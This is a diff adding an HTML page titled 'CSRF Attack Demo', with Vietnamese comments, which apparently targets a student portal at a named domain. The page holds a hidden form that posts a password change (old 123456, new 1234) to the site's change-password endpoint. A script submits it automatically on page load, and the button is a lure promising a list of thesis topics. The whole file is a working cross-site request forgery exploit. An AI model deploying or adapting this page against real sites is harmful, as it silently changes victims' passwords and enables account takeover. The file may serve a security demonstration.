@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack Demo</title>
+</head>
+<body>
+
+<!-- Form đổi mật khẩu giả -->
+<form action="deepz.id.vn/Views/sinhvien/home_sv.php?controller=sinhvien&action=DoiMatKhau" method="post">
+    <input type="hidden" name="matkhaucu" value="123456" />
+    <input type="hidden" name="matkhaumoi" value="1234" />
+    <input type="hidden" name="xn_matkhaumoi" value="1234" />
+    <button type="submit">Ấn vào đây để xem danh sách đề tài</button>
+</form>
+
+<script>
+    // Tự động gửi form khi tải trang (mô phỏng tấn công CSRF tự động)
+    document.forms[0].submit();
+</script>
+
+</body>
+</html>
